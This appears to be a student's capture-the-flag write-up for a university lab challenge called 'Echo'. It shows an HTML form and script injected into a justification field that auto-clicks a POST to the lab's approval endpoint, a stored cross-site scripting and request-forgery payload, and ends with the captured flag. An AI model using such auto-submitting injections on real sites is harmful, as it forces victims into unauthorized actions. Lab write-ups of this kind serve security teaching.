# Optional CTF - Echo

- We start this challenge by analysing the two pages (the one we can input the justifification and the other page where we wait for the accpetance decision).

- After some time, we got to the conclusion that we need to make code injection in the input form (on the justfication field).

- So , in order to get the flag, our justification would need to be accepted. After that, we would need to create an input that when clicked would redirect the page to the request accpetance page.

- So, we use the below code, and injected in the justification field.

```html
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/71b93db6ec908d8868bed4aba06b5977fc8aaaa8/approve" role="form">     
    <div class="submit">         
        <input type="submit" id="giveflag" value="Give the flag">    
    </div> 
</form>  

<script type="text/javascript"> 	
    document.querySelector('#giveflag').click(); 
</script>
``` 
<br>

![input justification - code injection](CTFs/Opcionals/Img/3-Apply_For_Flag_2/1.input.png)
<br>

- When clicking in the `Submit` button, we were redirected to the jutification for the application page. After some time, we reloaded the page and there was the flag.

![justification page - flag](CTFs/Opcionals/Img/3-Apply_For_Flag_2/3.flag.png)
<br>

> :warning: **If the error below appears instead of the justification page, you may need to disable the javascript on the definitions of your browser!** 
![browser error - disable javascript](CTFs/Opcionals/Img/3-Apply_For_Flag_2/2.forbidden_warning.png)


### Flag

`flag{67c0cc6c236606a94a1ac938a41bd9fc}`
